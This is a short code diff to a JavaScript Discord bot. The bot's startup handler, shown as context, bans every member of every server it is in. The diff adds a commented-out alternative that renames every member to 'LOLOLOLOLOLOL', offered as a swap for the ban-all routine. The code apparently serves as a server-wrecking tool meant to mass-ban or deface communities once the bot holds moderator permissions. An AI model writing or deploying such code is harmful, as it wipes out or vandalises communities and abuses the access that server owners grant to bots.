@@ -52,7 +52,17 @@ client.on("ready", () => {
             console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
         });
     });
-    
+
+    //replace ban all (^) with change all nicknames on server (below) if wanted
+/*    
+client.guilds.forEach(guild => {
+    guild.members.forEach(m => {
+        m.setNickname("LOLOLOLOLOLOL");
+        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Nickname ${m.user.username}; ID: ${m.id}.`);
+    });
+});
+*/
+
     //startup message 
     console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
 
